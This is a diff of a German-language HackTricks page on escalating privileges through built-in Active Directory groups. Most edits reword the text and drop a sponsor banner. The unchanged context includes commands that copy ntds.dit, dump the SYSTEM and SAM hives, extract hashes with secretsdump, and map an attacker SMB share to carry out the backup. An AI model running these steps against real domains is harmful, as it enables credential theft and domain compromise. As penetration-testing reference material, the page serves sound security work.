@@ -2,20 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
-Zugang heute erhalten:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
-## Bekannteste Gruppen mit Administrationsrechten
+## Bekannteste Gruppen mit Administrationsprivilegien
 
 - **Administratoren**
 - **Domänen-Administratoren**
 - **Enterprise-Administratoren**
 
-## Konto-Operatoren
+## Kontobetreiber
 
 Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Darüber hinaus ermöglicht sie die lokale Anmeldung am Domänencontroller (DC).
 
@@ -23,13 +16,13 @@ Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausg
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung an DC01.
+Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung bei DC01.
 
 ## AdminSDHolder-Gruppe
 
 Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie Berechtigungen für alle "geschützten Gruppen" innerhalb von Active Directory festlegt, einschließlich hochprivilegierter Gruppen. Dieser Mechanismus gewährleistet die Sicherheit dieser Gruppen, indem er unbefugte Änderungen verhindert.
 
-Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer volle Berechtigungen gewährt. Dies würde diesem Benutzer effektiv die volle Kontrolle über alle geschützten Gruppen geben. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.
+Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer vollständige Berechtigungen gewährt. Dies würde diesem Benutzer effektiv die vollständige Kontrolle über alle geschützten Gruppen geben. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.
 
 Befehle zur Überprüfung der Mitglieder und zur Änderung der Berechtigungen umfassen:
 ```powershell
@@ -41,7 +34,7 @@ Ein Skript ist verfügbar, um den Wiederherstellungsprozess zu beschleunigen: [I
 
 Für weitere Details besuchen Sie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
-## AD Recycle Bin
+## AD Papierkorb
 
 Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen von gelöschten Active Directory-Objekten, was sensible Informationen offenbaren kann:
 ```bash
@@ -53,7 +46,7 @@ Der Zugriff auf Dateien auf dem DC ist eingeschränkt, es sei denn, der Benutzer
 
 ### Privilegieneskalation
 
-Mit `PsService` oder `sc` von Sysinternals kann man die Berechtigungen von Diensten einsehen und ändern. Die Gruppe `Server Operators` hat beispielsweise die volle Kontrolle über bestimmte Dienste, was die Ausführung beliebiger Befehle und die Eskalation von Rechten ermöglicht:
+Mit `PsService` oder `sc` von Sysinternals kann man die Berechtigungen von Diensten einsehen und ändern. Die Gruppe `Server Operators` hat beispielsweise die volle Kontrolle über bestimmte Dienste, was die Ausführung beliebiger Befehle und die Privilegieneskalation ermöglicht:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -61,7 +54,7 @@ Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, was die Manip
 
 ## Backup Operators
 
-Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der Berechtigungen `SeBackup` und `SeRestore`. Diese Berechtigungen ermöglichen das Durchqueren von Ordnern, das Auflisten und das Kopieren von Dateien, selbst ohne ausdrückliche Berechtigungen, unter Verwendung des Flags `FILE_FLAG_BACKUP_SEMANTICS`. Es ist notwendig, spezifische Skripte für diesen Prozess zu verwenden.
+Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der `SeBackup`- und `SeRestore`-Berechtigungen. Diese Berechtigungen ermöglichen das Durchqueren von Ordnern, das Auflisten und das Kopieren von Dateien, selbst ohne ausdrückliche Berechtigungen, unter Verwendung des `FILE_FLAG_BACKUP_SEMANTICS`-Flags. Für diesen Prozess ist die Nutzung spezifischer Skripte erforderlich.
 
 Um die Gruppenmitglieder aufzulisten, führen Sie aus:
 ```powershell
@@ -113,7 +106,7 @@ Alternativ können Sie `robocopy` zum Kopieren von Dateien verwenden:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-3. Extrahiere `SYSTEM` und `SAM` zur Hash-Wiederherstellung:
+3. Extrahiere `SYSTEM` und `SAM` zur Hash-Abfrage:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
@@ -124,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Verwendung von wbadmin.exe
 
-1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und cachen Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
+1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und speichern Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
 2. Verwenden Sie `wbadmin.exe` für die Systembackup- und `NTDS.dit`-Extraktion:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -180,7 +173,7 @@ Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden
 
 DnsAdmins können DNS-Datensätze manipulieren, um Man-in-the-Middle (MitM)-Angriffe durch das Erstellen eines WPAD-Datensatzes nach Deaktivierung der globalen Abfrageblockliste durchzuführen. Tools wie Responder oder Inveigh können zum Spoofing und Erfassen von Netzwerkverkehr verwendet werden.
 
-### Event-Log-Reader
+### Event Log Readers
 Mitglieder können auf Ereignisprotokolle zugreifen und möglicherweise sensible Informationen wie Klartextpasswörter oder Details zur Befehlsausführung finden:
 ```powershell
 # Get members and search logs for sensitive information
@@ -240,7 +233,7 @@ Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Für Exploitationstechniken im Zusammenhang mit **WinRM** sollte spezifische Dokumentation konsultiert werden.
+Für Exploitationstechniken, die mit **WinRM** zusammenhängen, sollte spezifische Dokumentation konsultiert werden.
 
 #### Server Operators
 
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um Workflows einfach zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
-Zugang heute erhalten:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
